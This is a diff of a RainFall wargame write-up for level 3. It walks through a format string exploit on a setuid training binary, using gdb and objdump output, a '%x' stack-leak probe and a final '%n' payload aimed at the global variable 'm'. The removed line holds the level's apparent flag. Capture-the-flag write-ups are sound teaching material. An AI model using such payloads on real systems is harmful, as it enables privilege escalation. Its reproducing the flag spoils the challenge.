@@ -1,3 +1,33 @@
+LEVEL 3
+
+When logging as level3 in Rainfall we have a home with an executable called
+level3 :
+
+-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
+
+We can execute it :
+
+level3@RainFall:~$ ./level3
+hello there
+hello there
+
+It waits for an input from stdin and print it.
+
+Let's try with more arguments :
+
+level3@RainFall:~$ ./level3 "hi" "hello" "123456789"
+boom
+boom
+
+Nothing is changing, level2 is still waiting for stdin
+We can try to send a file as parameter :
+
+level3@RainFall:~$ echo "hello world" > /tmp/hello
+level3@RainFall:~$ ./level3 < /tmp/hello
+hello world
+
+Opening the executable with gdb :
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x0804851a <+0>:	push   %ebp
@@ -38,6 +68,27 @@ Dump of assembler code for function v:
    0x08048519 <+117>:	ret
 End of assembler dump.
 
-python -c 'print "A" * 12 + "\x8c\x98\x04\x08" + "%x " * 5 + "%x" + "%n"' | ./level3
+We deduce and read online about print exploit.
+It's called a format string exploit.
 
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+Basically it uses the format style of printf to print stack variable.
+
+Giving as an argument %x, which prints in hexa with printf we can see stack 
+variable next to printf :
+
+level3@RainFall:~$ python -c 'print "%x " * 9' | ./level3
+200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 
+
+To pass the condition at v + 59, eax must equal to 64
+
+level3@RainFall:~$ objdump -t level3
+....
+0804988c g     O .bss	00000004              m
+...
+
+m is a global not set variable.
+
+$(python -c 'print "A" * 12 + "\x8c\x98\x04\x08" + "%x " * 5 + "%x" + "%n"';cat)
+| ./level3
+
+
